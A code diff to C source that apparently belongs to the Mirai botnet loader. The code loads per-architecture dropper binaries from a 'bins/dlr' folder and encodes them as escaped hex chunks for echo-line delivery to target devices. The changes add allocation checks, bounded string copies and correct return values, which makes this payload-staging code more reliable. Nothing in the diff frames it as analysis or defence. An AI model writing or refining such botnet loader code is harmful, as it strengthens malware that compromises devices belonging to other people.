@@ -16,24 +16,44 @@ BOOL binary_init(void)
     if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
     {
         printf("Failed to load from bins folder!\n");
-        return;
+        return FALSE;
     }
 
     for (i = 0; i < pglob.gl_pathc; i++)
     {
         char file_name[256];
         struct binary *bin;
+        struct binary **tmp;
 
-        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
+        tmp = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
+        if (tmp == NULL)
+        {
+            printf("Failed to allocate memory for binary list\n");
+            globfree(&pglob);
+            return FALSE;
+        }
+        bin_list = tmp;
+        
         bin_list[bin_list_len] = calloc(1, sizeof (struct binary));
+        if (bin_list[bin_list_len] == NULL)
+        {
+            printf("Failed to allocate memory for binary\n");
+            globfree(&pglob);
+            return FALSE;
+        }
         bin = bin_list[bin_list_len++];
 
 #ifdef DEBUG
         printf("(%d/%d) %s is loading...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
 #endif
-        strcpy(file_name, pglob.gl_pathv[i]);
+        strncpy(file_name, pglob.gl_pathv[i], sizeof(file_name) - 1);
+        file_name[sizeof(file_name) - 1] = '\0';
         strtok(file_name, ".");
-        strcpy(bin->arch, strtok(NULL, "."));
+        char *arch = strtok(NULL, ".");
+        if (arch != NULL) {
+            strncpy(bin->arch, arch, sizeof(bin->arch) - 1);
+            bin->arch[sizeof(bin->arch) - 1] = '\0';
+        }
         load(bin, pglob.gl_pathv[i]);
     }
 
@@ -69,15 +89,31 @@ static BOOL load(struct binary *bin, char *fname)
     while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
     {
         char *ptr;
+        char **tmp;
         int i;
 
-        bin->hex_payloads = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
+        tmp = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
+        if (tmp == NULL)
+        {
+            printf("Failed to allocate memory for hex payloads\n");
+            fclose(file);
+            return FALSE;
+        }
+        bin->hex_payloads = tmp;
+        
         bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
+        if (bin->hex_payloads[bin->hex_payloads_len] == NULL)
+        {
+            printf("Failed to allocate memory for payload data\n");
+            fclose(file);
+            return FALSE;
+        }
         ptr = bin->hex_payloads[bin->hex_payloads_len++];
 
         for (i = 0; i < n; i++)
             ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
     }
 
-    return FALSE;
+    fclose(file);
+    return TRUE;
 }
